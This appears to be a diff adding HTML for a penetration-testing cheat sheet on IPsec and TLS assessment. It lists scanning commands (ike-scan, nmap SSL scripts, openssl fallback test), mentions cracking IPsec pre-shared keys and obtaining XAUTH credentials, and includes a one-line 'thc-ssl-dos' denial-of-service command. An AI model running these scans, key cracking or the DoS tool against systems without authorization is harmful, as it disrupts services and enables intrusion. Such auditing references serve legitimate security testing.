+                    <li><span>Tries to solve the confidentiality/integrity problems of the IP protocol. It provides HMAC of the origin and encrypts data.</span></li>
+                    <li><span>You can find hosts supporting Ipsec with:</span></li>
+                <pre><code>$&nbsp;ike-scan&nbsp;-q&nbsp;$iprange</code></pre>
+                    <li><span>Validate the follow:</span></li>
+                    <li><span>DH group can be insecure, allowing passive decryption.</span></li>
+                    <li><span>Preshared key (PSK) might be cracked.</span></li>
+                    <li><span>Obtaining the XAUTH once the PSK is known.</span></li>
+                    <li><span>For more info, refer to <strong>https://www.trustwave.com/Resources/SpiderLabs-Blog/Cracking-IKE-Mission-Improbable-(Part-1)/</strong>.</span></li>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>TLS</legend>
+                <ul>
+                    <li><span>Enumerating supported protocols and cipher suites</span></li>
+                <pre><code>$&nbsp;python&nbsp;prober.py&nbsp;$ip</code></pre>
+                    <li><span>Enumerating supported features and extensions</span></li>
+                <pre><code>$&nbsp;nmap&nbsp;--script&nbsp;ssl-enum-ciphers&nbsp;-p443</code></pre>
+                    <li><span>Certificate review</span></li>
+                <pre><code>$&nbsp;nmap&nbsp;-p443&nbsp;--script&nbsp;ssl-cert</code></pre>
+                    <li><span>You should validate that:</span></li>
+                        <ul>
+                            <li><span>The X.509 subject common name (CN) is correct for the service</span></li>
+                        </ul>
+                        <ul>
+                            <li><span>The issuer is reputable and certificate chain valid</span></li>
+                        </ul>
+                        <ul>
+                            <li><span>RSA or DSA public key values are longer than 2,048 bits</span></li>
+                        </ul>
+                        <ul>
+                            <li><span>DH public parameters are longer than 2,048 bits</span></li>
+                        </ul>
+                        <ul>
+                            <li><span>The certificate is valid and has not expired</span></li>
+                        </ul>
+                        <ul>
+                            <li><span>The certificate is signed using SHA-256</span></li>
+                        </ul>
+                    <li><span>Vulnerabilities:</span></li>
+                        <ul>
+                            <li><span>POODLE against CBC mode ciphers within SSL 3.0</span></li>
+                        </ul>
+                        <ul>
+                            <li><span>BEAST against CBC mode ciphers via TLS 1.0</span></li>
+                        </ul>
+                        <ul>
+                            <li><span>Byte biases in RC4 ciphers across all SSL and TLS protocol versions</span></li>
+                        </ul>
+                    <li><span>Validate if the key was generated with weak entropy:</span></li>
+                <pre><code>$&nbsp;nmap&nbsp;-p443&nbsp;--script&nbsp;ssl-known-key&nbsp;$1</code></pre>
+                    <li><span>Test failback:</span></li>
+                <pre><code>$&nbsp;openssl&nbsp;s_client&nbsp;-connect&nbsp;$ip&nbsp;-no_tls1_2&nbsp;-fallback_scsv</code></pre>
+                    <li><span>Test Dos:</span></li>
+                <pre><code>$&nbsp;thc-ssl-dos&nbsp;$ip</code></pre>
+                </ul>
+        </fieldset>
+    <script>new Highlighter().run(document);</script>
+    <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m = s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-106217827-1', 'auto'); ga('send', 'pageview'); </script>
+    
+</body></html>
